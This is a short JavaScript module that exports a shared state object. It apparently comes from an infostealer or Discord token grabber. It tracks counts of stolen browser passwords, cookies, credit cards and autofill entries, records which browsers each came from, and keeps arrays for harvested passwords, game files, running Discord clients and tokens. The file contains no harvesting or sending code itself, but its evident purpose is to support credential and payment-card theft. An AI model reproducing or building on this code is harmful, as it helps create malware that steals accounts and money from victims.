/**
 * Centralized in-memory data store.
 * Can be updated from any file where this module is imported.
 */

const state = {
  passwordCount: { value: 0 },
  cookieCount: { value: 0 },
  ccCount: { value: 0 },
  autofillCount: { value: 0 },

  // Arrays and Sets to track data
  cookiesBrowserUsed: new Set(),
  passwordsBrowserUsed: new Set(),
  cardsBrowserUsed: new Set(),
  autofilldataBrowserUsed: new Set(),
  allPasswords: [],
  gameFiles: [],
  runningDiscords: [],
  tokens: [],
};

module.exports = { state };
